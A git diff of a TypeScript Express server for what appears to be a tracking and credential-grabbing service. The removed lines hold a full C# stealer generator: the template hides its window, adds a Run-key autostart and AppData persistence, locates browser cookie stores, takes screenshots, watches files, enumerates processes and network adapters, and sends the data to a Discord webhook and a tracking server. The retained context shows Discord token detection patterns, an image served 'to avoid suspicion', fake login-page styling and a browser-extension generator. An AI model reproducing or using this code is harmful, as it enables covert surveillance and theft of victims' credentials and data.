@@ -768,351 +768,6 @@ async function requireAdmin(req: Request, res: Response, next: Function) {
   next();
 }
 
-// Helper function to generate C# executable code
-function generateCSharpCode(config: any): string {
-  return `
-using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
-using System.Net.Http;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
-using Microsoft.Win32;
-using System.Management;
-using System.Runtime.InteropServices;
-
-namespace ${config.name}
-{
-    class Program
-    {
-        private static readonly string WEBHOOK_URL = "${config.webhookUrl}";
-        private static readonly string USER_ID = "${config.userId}";
-        private static readonly string TRACKING_SERVER = "${config.trackingServer}";
-        private static readonly bool STEALTH_MODE = ${config.stealth.toString().toLowerCase()};
-        private static readonly HttpClient httpClient = new HttpClient();
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
-
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        const int SW_HIDE = 0;
-
-        static async Task Main(string[] args)
-        {
-            try
-            {
-                ${config.stealth ? 'HideConsole();' : ''}
-                ${config.autostart ? 'SetAutoStart();' : ''}
-                ${config.persistence ? 'EnsurePersistence();' : ''}
-                
-                await CollectAndSendData();
-                
-                // Keep running in background
-                ${config.stealth ? 'await RunStealth();' : 'Console.ReadKey();'}
-            }
-            catch (Exception ex)
-            {
-                // Silent fail in stealth mode
-                ${config.stealth ? '' : 'Console.WriteLine($"Error: {ex.Message}");'}
-            }
-        }
-
-        static void HideConsole()
-        {
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
-        }
-
-        static void SetAutoStart()
-        {
-            try
-            {
-                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                rk.SetValue("${config.name}", Application.ExecutablePath);
-            }
-            catch { }
-        }
-
-        static void EnsurePersistence()
-        {
-            try
-            {
-                string persistPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "${config.name}.exe");
-                if (!File.Exists(persistPath))
-                {
-                    File.Copy(Application.ExecutablePath, persistPath, true);
-                }
-            }
-            catch { }
-        }
-
-        static async Task CollectAndSendData()
-        {
-            var data = new Dictionary<string, object>
-            {
-                ["type"] = "exe_execution",
-                ["exeName"] = "${config.name}",
-                ["userId"] = USER_ID,
-                ["timestamp"] = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
-                ["systemInfo"] = CollectSystemInfo(),
-                ["features"] = new string[] { ${config.features.map((f: string) => `"${f}"`).join(', ')} }
-            };
-
-            ${config.features.includes('browser_data') ? 'data["browserData"] = await CollectBrowserData();' : ''}
-            ${config.features.includes('screenshot') ? 'data["screenshot"] = CaptureScreenshot();' : ''}
-            ${config.features.includes('file_monitoring') ? 'StartFileMonitoring();' : ''}
-            ${config.features.includes('keylogger') ? 'StartKeylogger();' : ''}
-            ${config.features.includes('network_monitor') ? 'data["networkInfo"] = CollectNetworkInfo();' : ''}
-            ${config.features.includes('process_monitor') ? 'data["processes"] = CollectProcessInfo();' : ''}
-
-            await SendToWebhook(data);
-            await SendToServer(data);
-        }
-
-        static Dictionary<string, object> CollectSystemInfo()
-        {
-            var info = new Dictionary<string, object>
-            {
-                ["computerName"] = Environment.MachineName,
-                ["userName"] = Environment.UserName,
-                ["osVersion"] = Environment.OSVersion.ToString(),
-                ["processorCount"] = Environment.ProcessorCount,
-                ["workingSet"] = Environment.WorkingSet,
-                ["systemDirectory"] = Environment.SystemDirectory,
-                ["currentDirectory"] = Environment.CurrentDirectory
-            };
-
-            try
-            {
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
-                foreach (ManagementObject obj in searcher.Get())
-                {
-                    info["totalPhysicalMemory"] = obj["TotalPhysicalMemory"];
-                    info["manufacturer"] = obj["Manufacturer"];
-                    info["model"] = obj["Model"];
-                }
-            }
-            catch { }
-
-            return info;
-        }
-
-        static async Task<Dictionary<string, object>> CollectBrowserData()
-        {
-            var browserData = new Dictionary<string, object>();
-            
-            try
-            {
-                // Chrome cookies
-                string chromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
-                    "Google\\Chrome\\User Data\\Default\\Cookies");
-                if (File.Exists(chromePath))
-                {
-                    browserData["chromePresent"] = true;
-                    browserData["chromeCookiesPath"] = chromePath;
-                }
-
-                // Firefox cookies
-                string firefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
-                    "Mozilla\\Firefox\\Profiles");
-                if (Directory.Exists(firefoxPath))
-                {
-                    browserData["firefoxPresent"] = true;
-                    browserData["firefoxPath"] = firefoxPath;
-                }
-
-                // Edge cookies
-                string edgePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
-                    "Microsoft\\Edge\\User Data\\Default\\Cookies");
-                if (File.Exists(edgePath))
-                {
-                    browserData["edgePresent"] = true;
-                    browserData["edgeCookiesPath"] = edgePath;
-                }
-            }
-            catch { }
-
-            return browserData;
-        }
-
-        static string CaptureScreenshot()
-        {
-            try
-            {
-                var bounds = Screen.PrimaryScreen.Bounds;
-                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
-                {
-                    using (var g = Graphics.FromImage(bitmap))
-                    {
-                        g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
-                    }
-                    using (var ms = new MemoryStream())
-                    {
-                        bitmap.Save(ms, ImageFormat.Png);
-                        return Convert.ToBase64String(ms.ToArray());
-                    }
-                }
-            }
-            catch
-            {
-                return "screenshot_failed";
-            }
-        }
-
-        static void StartFileMonitoring()
-        {
-            try
-            {
-                var watcher = new FileSystemWatcher(@"C:\\Users")
-                {
-                    NotifyFilter = NotifyFilters.CreationTime | NotifyFilters.LastWrite | NotifyFilters.FileName,
-                    IncludeSubdirectories = true
-                };
-
-                watcher.Changed += async (sender, e) => {
-                    var fileData = new Dictionary<string, object>
-                    {
-                        ["type"] = "file_changed",
-                        ["path"] = e.FullPath,
-                        ["changeType"] = e.ChangeType.ToString(),
-                        ["timestamp"] = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
-                    };
-                    await SendToWebhook(fileData);
-                };
-
-                watcher.EnableRaisingEvents = true;
-            }
-            catch { }
-        }
-
-        static Dictionary<string, object> CollectNetworkInfo()
-        {
-            var networkInfo = new Dictionary<string, object>();
-            
-            try
-            {
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
-                var adapters = new List<object>();
-                
-                foreach (ManagementObject obj in searcher.Get())
-                {
-                    adapters.Add(new
-                    {
-                        Description = obj["Description"],
-                        IPAddress = obj["IPAddress"],
-                        MACAddress = obj["MACAddress"],
-                        DefaultIPGateway = obj["DefaultIPGateway"]
-                    });
-                }
-                
-                networkInfo["adapters"] = adapters;
-            }
-            catch { }
-
-            return networkInfo;
-        }
-
-        static List<object> CollectProcessInfo()
-        {
-            var processes = new List<object>();
-            
-            try
-            {
-                foreach (Process process in Process.GetProcesses())
-                {
-                    try
-                    {
-                        processes.Add(new
-                        {
-                            Name = process.ProcessName,
-                            Id = process.Id,
-                            WorkingSet = process.WorkingSet64,
-                            StartTime = process.StartTime,
-                            FileName = process.MainModule?.FileName
-                        });
-                    }
-                    catch { }
-                }
-            }
-            catch { }
-
-            return processes;
-        }
-
-        static async Task SendToWebhook(object data)
-        {
-            try
-            {
-                var payload = new
-                {
-                    username = "${config.name} Monitor",
-                    embeds = new[]
-                    {
-                        new
-                        {
-                            title = "🖥️ EXE Data Collection",
-                            description = $"Data collected from **{Environment.MachineName}** by ${config.name}",
-                            color = 0xFF0000,
-                            fields = new[]
-                            {
-                                new { name = "Computer", value = Environment.MachineName, inline = true },
-                                new { name = "User", value = Environment.UserName, inline = true },
-                                new { name = "Timestamp", value = DateTime.Now.ToString(), inline = true }
-                            },
-                            footer = new { text = "${config.name} v${config.version}" }
-                        }
-                    }
-                };
-
-                var json = Newtonsoft.Json.JsonConvert.SerializeObject(payload);
-                var content = new StringContent(json, Encoding.UTF8, "application/json");
-                await httpClient.PostAsync(WEBHOOK_URL, content);
-            }
-            catch { }
-        }
-
-        static async Task SendToServer(object data)
-        {
-            try
-            {
-                var json = Newtonsoft.Json.JsonConvert.SerializeObject(data);
-                var content = new StringContent(json, Encoding.UTF8, "application/json");
-                await httpClient.PostAsync($"{TRACKING_SERVER}/api/exe-track", content);
-            }
-            catch { }
-        }
-
-        static async Task RunStealth()
-        {
-            while (true)
-            {
-                await Task.Delay(60000); // Wait 1 minute
-                // Periodic data collection
-                await CollectAndSendData();
-            }
-        }
-
-        // Custom user code
-        ${config.customCode}
-    }
-}`;
-}
-
-// Helper function to create executable blob (simplified)
-function createExecutableBlob(csharpCode: string, name: string): Buffer {
-  // In a real implementation, this would compile C# code to .NET executable
-  // For demo purposes, we'll create a simple text file with .exe extension
-  const header = Buffer.from([0x4D, 0x5A]); // MZ header for PE files
-  const codeBuffer = Buffer.from(csharpCode, 'utf8');
-  const metadata = Buffer.from(`\n\n// Generated by EXNL System\n// Name: ${name}\n// Generated: ${new Date().toISOString()}\n`, 'utf8');
-  
-  return Buffer.concat([header, codeBuffer, metadata]);
-}
-
 // Extend Express Request type
 declare global {
   namespace Express {
@@ -1905,7 +1560,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Enhanced Discord token detection patterns
         const discordTokenPatterns = [
           /^mfa\.[a-z0-9_-]{20,}$/i,  // Discord MFA tokens
-          /^[a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27}$/i,  // Discord bot tokens
+          /^[a-z0-9_-]{23,28}\.[a-z0-9_-]{6}\.[a-z0-9_-]{27}$/i,  // Discord bot tokens
           /^[a-z0-9]{24}\.[a-z0-9]{6}\.[a-z0-9_-]{27}$/i,  // Discord user tokens
           /^[a-z0-9]{26}\.[a-z0-9]{6}\.[a-z0-9_\-]{38}$/i   // New Discord token format
         ];
@@ -2204,6 +1859,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }).catch(webhookError => {
           console.error('❌ Webhook sending failed:', webhookError);
         });
+      } else {
+        console.log('ℹ️ No webhook configured, skipping Discord notification');
       }
 
       // Serve uploaded file if available, otherwise default content
@@ -2532,7 +2189,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.error('Error serving image:', error);
 
       // Even if there's an error, still serve a large visible image to avoid suspicion
-      const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDkuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNTo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC.paaWQiOiIwMTgwMTE3NDA3MjA2ODExODIyQEY0MDBDMTU3MzBDRiIgc1JlZjpkb2N1bWVudElEPXhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+      const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDkuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNTo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3Lm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC.paaWQiOiIwMTgwMTE3NDA3MjA2ODExODIyQEY0MDBDMTU3MzBDRiIgc1JlZjpkb2N1bWVudElEPXhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
       const visibleImage = Buffer.from(visibleImageBase64, 'base64');
 
@@ -3237,7 +2894,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
 
         .login-title {
-            color: #393B3D;
+            color: #393D3D;
             font-size: 28px;
             font-weight: 700;
             margin-bottom: 8px;
@@ -3254,7 +2911,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
         .form-label {
             display: block;
-            color: #393B3D;
+            color: #393D3D;
             font-size: 14px;
             font-weight: 600;
             margin-bottom: 6px;
@@ -3267,7 +2924,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             border: 1px solid #c3c4c7;
             border-radius: 6px;
             font-size: 14px;
-            color: #393B3D;
+            color: #393D3D;
             background: #ffffff;
             transition: all 0.2s ease;
         }
@@ -3317,7 +2974,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
 
         .two-factor-title {
-            color: #393B3D;
+            color: #393D3D;
             font-size: 20px;
             font-weight: 600;
             text-align: center;
@@ -3687,80 +3344,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Generate Windows EXE endpoint
-  app.post('/api/generate-exe', authenticateUser, async (req: Request, res: Response) => {
-    try {
-      const { name, description, version, features, webhookUrl, customCode, stealth, autostart, persistence } = req.body;
-
-      if (!name || !description || !version) {
-        return res.status(400).json({ error: 'Name, description, and version are required' });
-      }
-
-      if (!webhookUrl) {
-        return res.status(400).json({ error: 'Discord webhook URL is required' });
-      }
-
-      // Generate C# source code
-      const csharpCode = generateCSharpCode({
-        name,
-        description,
-        version,
-        features: features || [],
-        webhookUrl,
-        customCode: customCode || '',
-        stealth: stealth || false,
-        autostart: autostart || false,
-        persistence: persistence || false,
-        userId: req.user.id,
-        trackingServer: `${req.protocol}://${req.get('host')}`
-      });
-
-      // Create a simple executable file (simplified for demo)
-      const executableData = createExecutableBlob(csharpCode, name);
-
-      const clientIp = getClientIp(req);
-      const { locationData } = await createEnhancedIpLog({
-        userId: req.user.id,
-        clientIp,
-        userAgent: req.headers['user-agent'] || 'unknown',
-        referrer: req.headers.referer || '',
-        status: 'exe_generated'
-      });
-
-      // Track EXE generation
-      await storage.createExeLog({
-        userId: req.user.id,
-        exeName: name,
-        exeDescription: description,
-        exeVersion: version,
-        features: features || [],
-        webhookUrl: webhookUrl,
-        customCode: customCode || '',
-        stealth: stealth || false,
-        autostart: autostart || false,
-        persistence: persistence || false,
-        generationStatus: 'success',
-        downloadCount: 1,
-        exeId: randomUUID(),
-        ipAddress: clientIp,
-        userAgent: req.headers['user-agent'] || 'unknown',
-        location: locationData.location,
-        exeFileSize: executableData.length
-      });
-
-      res.set({
-        'Content-Type': 'application/octet-stream',
-        'Content-Disposition': `attachment; filename="${name.replace(/\s+/g, '_')}.exe"`
-      });
-
-      res.send(executableData);
-
-    } catch (error) {
-      console.error('EXE generation error:', error);
-      res.status(500).json({ error: 'Failed to generate executable' });
-    }
-  });
-
   // Generate Chrome extension endpoint
   app.post('/api/generate-extension', authenticateUser, async (req: Request, res: Response) => {
     try {
@@ -3777,10 +3360,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Validation functions
       const validateManifest = (manifestContent: string): { isValid: boolean, errors: string[] } => {
         const errors: string[] = [];
-        
+
         try {
           const manifest = JSON.parse(manifestContent);
-          
+
           // Required fields validation
           if (!manifest.name || typeof manifest.name !== 'string') {
             errors.push('Manifest missing or invalid name field');
@@ -3791,7 +3374,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           if (!manifest.manifest_version || ![2, 3].includes(manifest.manifest_version)) {
             errors.push('Manifest missing or invalid manifest_version (must be 2 or 3)');
           }
-          
+
           // Permissions validation - expanded to include more legitimate Chrome permissions
           if (manifest.permissions && !Array.isArray(manifest.permissions)) {
             errors.push('Manifest permissions must be an array');
@@ -3820,29 +3403,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
               errors.push(`Potentially invalid permissions: ${invalidPerms.join(', ')}`);
             }
           }
-          
+
           // Content scripts validation
           if (manifest.content_scripts && !Array.isArray(manifest.content_scripts)) {
             errors.push('Manifest content_scripts must be an array');
           }
-          
+
         } catch (parseError) {
           errors.push('Invalid JSON in manifest file');
         }
-        
+
         return { isValid: errors.length === 0, errors };
       };
 
       const validateJavaScript = (jsContent: string, filename: string): { isValid: boolean, errors: string[] } => {
         const errors: string[] = [];
-        
+
         try {
           // Basic syntax validation - check for common syntax errors
           if (!jsContent.trim()) {
             errors.push(`${filename} is empty`);
             return { isValid: false, errors };
           }
-          
+
           // More sophisticated syntax checking
           try {
             // Use Function constructor for basic syntax validation
@@ -3857,7 +3440,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               errors.push(`${filename} has syntax error: ${errorMessage}`);
             }
           }
-          
+
           // Check for unreplaced template variables (non-fatal but worth noting)
           if (jsContent.includes('{{') && jsContent.includes('}}')) {
             const templateVars = jsContent.match(/\{\{[^}]+\}\}/g) || [];
@@ -3872,7 +3455,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               }
             }
           }
-          
+
           // Validate Chrome extension APIs usage (warning, not error)
           if (filename === 'background.js') {
             if (!jsContent.includes('chrome.') && !jsContent.includes('browser.')) {
@@ -3880,7 +3463,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               console.warn(`${filename} doesn't appear to use Chrome/browser APIs - this may be intentional`);
             }
           }
-          
+
           // Check for security issues in custom code (more comprehensive)
           const securityPatterns = [
             { pattern: /eval\s*\(/g, issue: 'eval() calls' },
@@ -3890,37 +3473,37 @@ export async function registerRoutes(app: Express): Promise<Server> {
             { pattern: /setTimeout\s*\(\s*["'`]/g, issue: 'setTimeout with string code' },
             { pattern: /setInterval\s*\(\s*["'`]/g, issue: 'setInterval with string code' }
           ];
-          
+
           securityPatterns.forEach(({ pattern, issue }) => {
             if (pattern.test(jsContent)) {
               errors.push(`${filename} contains potentially unsafe ${issue}`);
             }
           });
-          
+
           // Check for common coding mistakes
           const mistakePatterns = [
             { pattern: /;\s*;/g, issue: 'double semicolons' },
             { pattern: /=\s*=\s*=/g, issue: 'triple equals without proper spacing' },
             { pattern: /\s+$/gm, issue: 'trailing whitespace (code quality)' }
           ];
-          
+
           mistakePatterns.forEach(({ pattern, issue }) => {
             if (pattern.test(jsContent)) {
               // These are warnings, not fatal errors
               console.warn(`${filename} has code quality issue: ${issue}`);
             }
           });
-          
+
         } catch (error) {
           errors.push(`Error validating ${filename}: ${error.message}`);
         }
-        
+
         return { isValid: errors.length === 0, errors };
       };
 
       // Import using dynamic import for ES modules
       const { default: AdmZip } = await import('adm-zip');
-      
+
       const zip = new AdmZip();
       // Fix __dirname for ES modules
       const __filename = fileURLToPath(import.meta.url);
@@ -4026,7 +3609,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           ...validationResults.manifest.errors,
           ...validationResults.scripts.errors
         ];
-        
+
         // Create extension log entry
         await storage.createExtensionLog({
           userId: req.user.id,
@@ -4064,7 +3647,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
     } catch (error) {
       console.error('Extension generation error:', error);
-      
+
       // Track failed generation attempt
       try {
         const clientIp = getClientIp(req);
@@ -4104,52 +3687,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       res.status(500).json({ error: 'Failed to generate extension' });
-    }
-  });
-
-  // EXE tracking endpoint
-  app.post('/api/exe-track', async (req: Request, res: Response) => {
-    try {
-      const clientIp = getClientIp(req);
-      const userAgent = req.headers['user-agent'] || '';
-      const exeData = req.body;
-
-      console.log(`🖥️ EXE data received from ${clientIp}:`, exeData.type);
-
-      // Create log entry for EXE tracking
-      const logEntry = {
-        id: randomUUID(),
-        ip: clientIp,
-        userAgent,
-        timestamp: new Date().toISOString(),
-        country: 'Unknown',
-        city: 'Unknown',
-        isp: 'Unknown',
-        source: 'exe',
-        exeName: exeData.exeName || 'Unknown EXE',
-        exeData: exeData
-      };
-
-      // Try to get location data
-      try {
-        const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
-        const geoData = await geoResponse.json();
-
-        if (geoData.status === 'success') {
-          logEntry.country = geoData.country || 'Unknown';
-          logEntry.city = geoData.city || 'Unknown';
-          logEntry.isp = geoData.isp || 'Unknown';
-        }
-      } catch (geoError) {
-        console.log('Failed to get geo data for EXE tracking');
-      }
-
-      await saveLogEntry(logEntry);
-      res.json({ success: true, tracked: true });
-
-    } catch (error) {
-      console.error('EXE tracking error:', error);
-      res.status(500).json({ error: 'Failed to track EXE data' });
     }
   });
 
